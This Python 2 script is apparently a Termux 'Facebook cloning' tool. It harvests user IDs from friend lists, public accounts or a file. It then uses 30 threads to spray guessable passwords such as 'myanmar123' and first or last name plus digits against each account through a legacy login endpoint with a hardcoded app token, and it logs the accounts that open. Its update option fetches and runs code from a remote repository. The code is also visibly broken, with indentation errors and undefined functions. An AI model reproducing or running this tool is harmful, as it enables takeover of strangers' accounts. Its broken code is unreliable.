#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 lovehacker.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo='''
\033[1;91m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;91m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;97m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;97m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  \033[1;94m

╒══════════════════⭐══════════════════╕
\033[1;96m    FACEBOOK   : TECHNOLOGY BY M4RMU
 \033[1;96m    AUTHOR    : M4RMU
 \033[1;96m    GITHUB    : B4BY DR4G0N 
 \033[1;96m   TELEGRAM   : TERMUX MY4NM4R TEAM　\033[1;94m
╘═══════════🍁═════════════🍁══════════╛
'''
B4BY = 'AWD'
DRAGON = 'BARMA'
os.system('clear')
loop = 'true'
while loop == 'true':
    os.system (" toilet -F gay -f slant AYARWADY")
    username = raw_input('\x1b[1;97m👹 USERNAME TOOL=>>: \33[1;96m')
    if username == B4BY:
        password = raw_input('\x1b[1;97m👹 PASSWORD TOOL =>>: \033[1;96m')
        if password == DRAGON:
            print '\x1b[1;92m[\xe2\x9c\x93] HELLO GONG GYI!' + username
            jalan ("\033[1;96m DO YOU KNOW M4RMU")
            jalan ('\033[1;97m NOW YOU READY TO USE THIS TOOL')
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;91mPASWORD NOT ACTIVATED'
            os.system('xdg-open https://t.me/@profisor_cracker313')
    else:
        print '\x1b[1;91mUSERNAME NOT ACTIVATED'
        os.system('xdg-open https://t.me/@profisor_cracker313')

back=0
successfull=[]
checkpoint=[]
oks=[]
cps=[]
id=[]

####Start#####
def main():
    os.system('clear')
    print logo
    print ' \t [\x1b[1;97m\x1b[1;41m   This tool is equation proposed only ..   \x1b[0m\x1b[1;93m]'.center(50)
    print 54 * '\x1b[1;93m_'
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mStart Cloning....'
    print '\x1b[1;93m[2] \x1b[1;92mContact Owner On Facebook'
    print '\x1b[1;93m[3] \x1b[1;92mContact Owner On WhatsApp'
    print '\x1b[1;93m[4] \x1b[1;92mjoin Our Facebook Group '
    print '\x1b[1;93m[0] \x1b[1;92mExit'
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    os.system('xdg-open https://www.facebook.com/Naim.Vau80')
    main_select()


def main_select():
    SYED = raw_input('\n\x1b[1;93mChoose Option \xe2\x89\xbb \x1b[1;92m')
    if SYED == '':
        print '\x1b[1;97mFill in correctly'
        main()
    elif SYED == '1':
        login()
    elif SYED == '2':
        os.system('xdg-open https://www.facebook.com/Naim.Vau80')
        main()
    elif SYED == '3':
        os.system('xdg-open https://www.facebook.com/Naim.Vau80')
        main()
    elif SYED == '4':
        os.system('xdg-open https://www.facebook.com/Naim.Vau80')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
        print '\x1b[1;91m[!] Please select a valid option'.center(50)
        time.sleep(2)
        main()


def mainlogin():
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '    \t [\x1b[1;97m\x1b[1;41m   Login menu   \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        print '\x1b[1;93m[1] \x1b[1;92mLogin With Fb Token\n'
        print '\x1b[1;93m[2] \x1b[1;92mLogin With Fb id/pass\n'
        print '\x1b[1;93m[3] \x1b[1;92mWithout Login Cloning\n'
        print '\x1b[1;93m[4] \x1b[1;92mBack '
        print 47 * '\x1b[1;93m\xe2\x96\xac'
        print ''
        log_select()



def log_select():
    sel = raw_input('Choose option: \x1b[1;92m')
    if sel == '2':
        idlogin()
    elif sel == '1':
        token()
    elif sel == '3':
        os.system('python2 without.py')
    elif sel == '4':
        main()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()

#### login ####
def idlogin():
	cb()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print (logo)
		print (R + '◈━━━━▷' + S + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ Account ' + R + '◁━━━━◈')
		print
		id=raw_input(S + '[︻デ═一] ' + S + 'Email/number/username: ' + G +'')
		pwd=getpass.getpass(S + '[︻デ═一] ' + R + 'Password : ')
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("token.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print (S + '[︻デ═一]' + Y + ' Login successfull 100% ✓')
		    os.system('xdg-open https://www.facebook.com/alaminkhan.60')
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print (R + 'Account has a checkpoint !')
		        t()
		        login()
		    else:
		        print (R + 'number/user id/ password is wrong !')
		        trb()
		        t()
		        login()

def token():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ' \t        [\x1b[1;97m\x1b[1;41m  Paste Token  \x1b[0m\x1b[1;93m]'.center(50)
        print ''
        print ''
        token = raw_input(' \x1b[1;92m[+] Token : \x1b[1;93m')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()


def menu():
	cb()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + 'Token Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (G + 'Account has a checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (W + 'No internet connection !')
		t()
		exb()
	cb()
	print (logo)
	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + '︻デ═一1' + S + ']' + S + ' Fast Cracking...')
	print (S + '[' + P + '︻デ═一2' + S + ']' + S + ' Update Tool')
	print (S + '[' + P + '︻デ═一3' + S + ']' + S + ' Contact My Facebook Page')
	print (S + '[' + Y + '︻デ═一4' + S + ']' + G + ' Log Out')
	print (S + '[' + Y + '︻デ═一0' + S + ']' + R + ' Exit')
	print
	print (S + 50*'-')
	print
	mb()


def mb():
	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('rm -rf $HOME/HAUNTERDEVILL')
	    os.system('cd $HOME && git clone https://github.com/DevillHaunter/HAUNTERDEVILL/')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    psb('☆☆☆30%')
	    psb('☆☆☆☆40%')
	    psb('☆☆☆☆☆50%')
	    psb('☆☆☆☆☆☆60%')
	    psb('☆☆☆☆☆☆☆70%')
	    psb('☆☆☆☆☆☆☆☆80%')
	    psb('☆☆☆☆☆☆☆☆☆90%')
	    psb('☆☆☆☆☆☆☆☆☆☆100%')
	    psb('login with new Account✓')
	    psb('WellCome TO MYANMAR ')
	    psb('Congratulation... Tool Has Been Updated Successfull..')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/HAUNTERDEVILL && python2 haunter.py')
	elif bm =='3':
	    os.system('xdg-open https://www.facebook.com/md.kumruuzzaman')
	    menu()
	elif bm =='4':
		psb('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()


def pak():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print (S + '[' + P + '︻デ═一1' + S + ']' + P + ' Clone With Friend List')
	print (S + '[' + P + '︻デ═一2' + S + ']' + P + ' Clone From Public Account')
	print (S + '[' + Y + '︻デ═一3' + S + ']' + Y + ' Clone From File')
	print (S + '[' + R + '︻デ═一0' + S + ']' + R + ' Back')
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[︻デ═一] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			psb(S + '[︻デ═一]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[︻デ═一] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Fount !')
			raw_input(R + ' Back')
			pak()
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[☆]' + P + ' Total Friends: ' + W + str(len(id)))
	psb(S + '[☆]' + S + ' Haunter Tool Started Cloning Please Wait........... .To stop process  click on CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, oks
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('myanmar123')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps1)
			        oks.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'123')
			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps2)
			                oks.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'1234')
			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=(j['first_name']+['last_name'])
			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=(j['last_name']+'1234')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
			                                                oks.append(user+ps6)
                                                                    else:
			                                                ps7=(j['fast_name']+'424')
			                                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                                k=json.load(dt)
			                                                if 'www.facebook.com' in k['error_msg']:
			                                                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
			                                                    cps.append(user+ps6)
			                                                else:
			                                                    if 'access_token' in k:
			                                                        print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
			                                                        oks.append(user+ps7)


		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print(S+'Process has been completed CP ID Open After 72 Hours')
	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
	print(S+'HAUNTERBOY')     
	print
	raw_input(R + 'Back')
	os.system('python2 haunter.py')
if __name__=='__main__':
    login()
